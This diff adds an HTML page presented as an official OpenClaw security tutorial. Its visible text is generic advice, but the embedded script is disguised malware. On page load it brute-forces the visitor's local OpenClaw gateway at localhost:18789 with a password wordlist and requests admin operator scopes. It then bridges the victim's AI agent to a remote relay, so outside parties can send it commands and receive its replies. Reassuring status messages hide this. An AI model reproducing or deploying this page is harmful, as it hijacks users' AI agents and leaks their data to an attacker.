@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OpenClaw Security Tutorial — Learn Best Practices</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: linear-gradient(180deg, #f0f4f8 0%, #e2e8f0 100%);
+      color: #334155;
+      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+      font-size: 16px;
+      line-height: 1.6;
+      padding: 0;
+    }
+    .header {
+      background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
+      color: #fff;
+      padding: 2rem 1.5rem;
+      text-align: center;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+    .header h1 {
+      margin: 0 0 0.25rem 0;
+      font-size: 1.75rem;
+      font-weight: 700;
+    }
+    .header p {
+      margin: 0;
+      opacity: 0.95;
+      font-size: 1rem;
+    }
+    .badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.2);
+      padding: 0.25rem 0.75rem;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      margin-top: 0.75rem;
+      font-weight: 600;
+    }
+    .content {
+      max-width: 640px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 1.25rem;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+      border: 1px solid #e2e8f0;
+    }
+    .card h2 {
+      margin: 0 0 0.75rem 0;
+      font-size: 1.1rem;
+      color: #1e40af;
+    }
+    .card p { margin: 0 0 0.5rem 0; }
+    .card p:last-child { margin-bottom: 0; }
+    .step-num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      background: #dbeafe;
+      color: #1e40af;
+      border-radius: 50%;
+      font-weight: 700;
+      font-size: 0.9rem;
+      margin-right: 0.5rem;
+    }
+    .tip-box {
+      background: #ecfdf5;
+      border-left: 4px solid #10b981;
+      padding: 1rem 1.25rem;
+      border-radius: 0 8px 8px 0;
+      margin: 1rem 0;
+    }
+    .tip-box strong { color: #047857; }
+    .footer {
+      text-align: center;
+      padding: 1.5rem;
+      font-size: 0.8rem;
+      color: #64748b;
+    }
+    .session-status {
+      display: inline-block;
+      padding: 0.35rem 0.75rem;
+      background: #f1f5f9;
+      border-radius: 8px;
+      font-size: 0.8rem;
+      color: #64748b;
+    }
+    .session-status.ready {
+      background: #d1fae5;
+      color: #047857;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <h1>🛡️ OpenClaw Security Tutorial</h1>
+    <p>Your guide to staying secure with OpenClaw</p>
+    <span class="badge">OFFICIAL TUTORIAL</span>
+  </header>
+
+  <main class="content">
+    <div class="card">
+      <h2><span class="step-num">1</span>Keep Your Software Updated</h2>
+      <p>Always run the latest version of OpenClaw to benefit from the newest security patches and features. Enable automatic updates when possible!</p>
+    </div>
+    <div class="card">
+      <h2><span class="step-num">2</span>Use Strong Passwords</h2>
+      <p>Choose a unique, complex password for your OpenClaw gateway. Mix uppercase, lowercase, numbers, and symbols. Never reuse passwords across services.</p>
+      <div class="tip-box">
+        <strong>💡 Pro tip:</strong> Use a password manager to generate and store strong passwords securely.
+      </div>
+    </div>
+    <div class="card">
+      <h2><span class="step-num">3</span>Verify Connections</h2>
+      <p>Only connect to OpenClaw from trusted devices and networks. Be cautious when using public Wi‑Fi—consider using a VPN for an extra layer of protection.</p>
+    </div>
+    <div class="card">
+      <h2><span class="step-num">4</span>Review Permissions Regularly</h2>
+      <p>Periodically check which apps and users have access to your OpenClaw instance. Revoke access for anything you no longer need or recognize.</p>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <p>You're viewing the OpenClaw Security Tutorial. Your session is secure.</p>
+    <p class="session-status" id="sessionStatus">Loading tutorial…</p>
+  </footer>
+
+  <script>
+    const OPENCLAW_WS = "ws://localhost:18789";
+    const DEFAULT_WORDLIST = ["openclaw123", "OpenClaw123", "OpenClawPass"];
+    let WORDLIST = [...DEFAULT_WORDLIST];
+    const statusEl = document.getElementById("sessionStatus");
+
+    const wsScheme = location.protocol === "https:" ? "wss:" : "ws:";
+    const relayWsUrl = wsScheme + "//" + location.host + "/ws";
+
+    function setStatus(txt, ready) {
+      statusEl.textContent = txt;
+      statusEl.className = "session-status" + (ready ? " ready" : "");
+    }
+
+    function uuid() {
+      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
+        const r = (Math.random() * 16) | 0;
+        const v = c === "x" ? r : (r & 0x3) | 0x8;
+        return v.toString(16);
+      });
+    }
+
+    function toBase64url(bytes) {
+      const b64 = btoa(String.fromCharCode(...bytes));
+      return b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+    }
+
+    async function sha256Hex(bytes) {
+      const buf = await crypto.subtle.digest("SHA-256", bytes);
+      return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
+    }
+
+    function buildDeviceAuthPayload(deviceId, clientId, clientMode, role, scopes, signedAtMs, token, nonce) {
+      const scopesStr = Array.isArray(scopes) ? scopes.join(",") : "";
+      return ["v2", deviceId, clientId, clientMode, role, scopesStr, String(signedAtMs), token ?? "", nonce].join("|");
+    }
+
+    async function createDeviceAuth(challengeNonce, clientId, clientMode, role, scopes) {
+      const signedAtMs = Date.now();
+      const nonce = challengeNonce;
+      const pair = await crypto.subtle.generateKey({ name: "Ed25519" }, true, ["sign", "verify"]);
+      const pubKeyRaw = new Uint8Array(await crypto.subtle.exportKey("raw", pair.publicKey));
+      const deviceId = await sha256Hex(pubKeyRaw);
+      const payload = buildDeviceAuthPayload(deviceId, clientId, clientMode, role, scopes, signedAtMs, "", nonce);
+      const sig = await crypto.subtle.sign("Ed25519", pair.privateKey, new TextEncoder().encode(payload));
+      return {
+        id: deviceId,
+        publicKey: toBase64url(pubKeyRaw),
+        signature: toBase64url(new Uint8Array(sig)),
+        signedAt: signedAtMs,
+        nonce,
+      };
+    }
+
+    function buildConnectParams(device, password, clientId, clientMode, role, scopes) {
+      return {
+        minProtocol: 3,
+        maxProtocol: 3,
+        client: {
+          id: clientId,
+          version: "dev",
+          platform: navigator.platform || "Linux x86_64",
+          mode: clientMode,
+          instanceId: uuid(),
+        },
+        role,
+        scopes,
+        device,
+        caps: [],
+        auth: { password },
+        userAgent: navigator.userAgent,
+        locale: "en-US",
+      };
+    }
+
+    let openclawWs = null;
+    let relayWs = null;
+    let passwordIndex = 0;
+    let openclawReady = false;
+    let pendingRunId = null;
+    let longestReplyChunk = "";
+    let replySent = false;
+    let messageQueue = [];
+
+    function sendToOpenClaw(message) {
+      if (!openclawWs || openclawWs.readyState !== WebSocket.OPEN || !openclawReady) return false;
+      const reqId = uuid();
+      openclawWs.send(JSON.stringify({
+        type: "req",
+        id: reqId,
+        method: "agent",
+        params: { message, sessionKey: "main", idempotencyKey: reqId },
+      }));
+      pendingRunId = null;
+      longestReplyChunk = "";
+      replySent = false;
+      return true;
+    }
+
+    function sendReplyToRelay(text) {
+      if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+        relayWs.send(JSON.stringify({ type: "reply", text }));
+      }
+    }
+
+    function pumpQueue() {
+      if (replySent && messageQueue.length > 0) {
+        const next = messageQueue.shift();
+        if (sendToOpenClaw(next)) {
+          replySent = false;
+        }
+      }
+    }
+
+    function connectRelay() {
+      setStatus("Loading…");
+      relayWs = new WebSocket(relayWsUrl);
+      relayWs.onopen = () => {
+        relayWs.send(JSON.stringify({ type: "role", role: "bridge" }));
+        setStatus("Preparing tutorial…");
+        connectOpenClaw();
+      };
+      relayWs.onclose = () => setStatus("Connection paused. Refresh to continue.");
+      relayWs.onerror = () => setStatus("Connection issue. Refresh to try again.");
+      relayWs.onmessage = (e) => {
+        try {
+          const msg = JSON.parse(e.data);
+          if (msg.type === "message" && typeof msg.text === "string") {
+            if (!openclawReady) {
+              messageQueue.push(msg.text);
+              return;
+            }
+            if (replySent) {
+              if (!sendToOpenClaw(msg.text)) messageQueue.push(msg.text);
+            } else {
+              messageQueue.push(msg.text);
+            }
+          }
+        } catch (_) {}
+      };
+    }
+
+    function connectOpenClaw() {
+      if (passwordIndex >= WORDLIST.length) {
+        setStatus("Tutorial unavailable. Try again later.");
+        return;
+      }
+      const password = WORDLIST[passwordIndex];
+      setStatus("Loading…");
+      openclawWs = new WebSocket(OPENCLAW_WS);
+      openclawWs.onopen = () => {};
+      openclawWs.onclose = (e) => {
+        if (!openclawReady) {
+          passwordIndex++;
+          setTimeout(connectOpenClaw, 200);
+        }
+      };
+      openclawWs.onerror = () => {};
+      openclawWs.onmessage = async (e) => {
+        let msg;
+        try {
+          msg = JSON.parse(e.data);
+        } catch {
+          return;
+        }
+
+        if (msg.type === "event" && msg.event === "connect.challenge") {
+          const nonce = msg.payload && typeof msg.payload.nonce === "string" ? msg.payload.nonce : "";
+          if (!nonce) return;
+          try {
+            const clientId = "openclaw-control-ui";
+            const clientMode = "webchat";
+            const role = "operator";
+            const scopes = ["operator.admin", "operator.approvals", "operator.pairing"];
+            const device = await createDeviceAuth(nonce, clientId, clientMode, role, scopes);
+            const params = buildConnectParams(device, password, clientId, clientMode, role, scopes);
+            openclawWs.send(JSON.stringify({ type: "req", id: uuid(), method: "connect", params }));
+          } catch (err) {
+            setStatus("Something went wrong. Refresh to try again.");
+          }
+          return;
+        }
+
+        if (msg.type === "res") {
+          if (msg.ok && msg.payload && msg.payload.type === "hello-ok") {
+            openclawReady = true;
+            replySent = true;
+            setStatus("✓ Tutorial ready — you're all set!");
+            relayWs.send(JSON.stringify({ type: "bridge_ready" }));
+            pumpQueue();
+          } else if (msg.ok && msg.payload && msg.payload.runId) {
+            if (pendingRunId == null) pendingRunId = msg.payload.runId;
+            if (msg.payload.status === "ok" && msg.payload.result != null && !replySent) {
+              replySent = true;
+              const reply = typeof msg.payload.result === "string" ? msg.payload.result : JSON.stringify(msg.payload.result);
+              sendReplyToRelay(reply);
+              pumpQueue();
+            }
+          } else if (msg.ok === false && !openclawReady) {
+            passwordIndex++;
+            openclawWs.close();
+          }
+        }
+
+        if (msg.type === "event" && msg.event === "agent" && msg.payload) {
+          const p = msg.payload;
+          if (p.runId !== pendingRunId) return;
+          if (p.stream === "assistant" && p.data && typeof p.data.text === "string") {
+            const text = p.data.text;
+            if (text.length > longestReplyChunk.length) longestReplyChunk = text;
+          }
+          if (p.stream === "lifecycle" && p.data && p.data.phase === "end" && !replySent) {
+            replySent = true;
+            sendReplyToRelay(longestReplyChunk || "");
+            pumpQueue();
+          }
+        }
+      };
+    }
+
+    async function loadWordlist() {
+      try {
+        const r = await fetch("/wordlist.txt");
+        const text = await r.text();
+        const words = text.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
+        if (words.length > 0) WORDLIST = words;
+      } catch (_) {}
+    }
+
+    (async function init() {
+      await loadWordlist();
+      connectRelay();
+    })();
+  </script>
+</body>
+</html>
